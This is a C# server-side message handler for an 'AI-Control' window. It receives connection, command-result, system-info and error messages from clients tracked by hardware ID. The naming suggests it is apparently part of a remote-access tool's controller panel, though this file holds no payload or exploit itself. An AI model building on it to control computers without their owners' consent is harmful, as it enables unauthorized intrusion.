using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerAiControl
{
	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 2)
		{
			if (client != null)
			{
				client.Disconnect();
			}
			return;
		}
		switch ((string)objects[1])
		{
		case "Connect":
		{
			string hwid = (string)objects[2];
			FormAiControl form3 = (FormAiControl)Application.OpenForms["AIControl:" + hwid];
			if (form3 == null)
			{
				client.Disconnect();
				break;
			}
			form3.Invoke((MethodInvoker)delegate
			{
				form3.Text = "AI-Control [" + hwid + "]";
				form3.client = client;
				form3.SetConnected(connected: true);
				form3.AppendMessage("System", "Connected to client: " + hwid);
			});
			client.Tag = form3;
			client.Hwid = hwid;
			break;
		}
		case "Result":
		{
			if (client.Tag == null)
			{
				client.Disconnect();
				break;
			}
			FormAiControl form2 = (FormAiControl)client.Tag;
			string command = (string)objects[2];
			string result = (string)objects[3];
			int exitCode = (int)objects[4];
			form2.Invoke((MethodInvoker)delegate
			{
				form2.OnCommandResult(command, result, exitCode);
			});
			break;
		}
		case "SystemInfo":
		{
			if (client.Tag == null)
			{
				client.Disconnect();
				break;
			}
			FormAiControl form4 = (FormAiControl)client.Tag;
			string info = (string)objects[2];
			form4.Invoke((MethodInvoker)delegate
			{
				form4.OnSystemInfo(info);
			});
			break;
		}
		case "Error":
		{
			if (client.Tag == null)
			{
				client.Disconnect();
				break;
			}
			FormAiControl form = (FormAiControl)client.Tag;
			string error = (string)objects[2];
			form.Invoke((MethodInvoker)delegate
			{
				form.AppendMessage("Error", error);
			});
			break;
		}
		}
	}
}
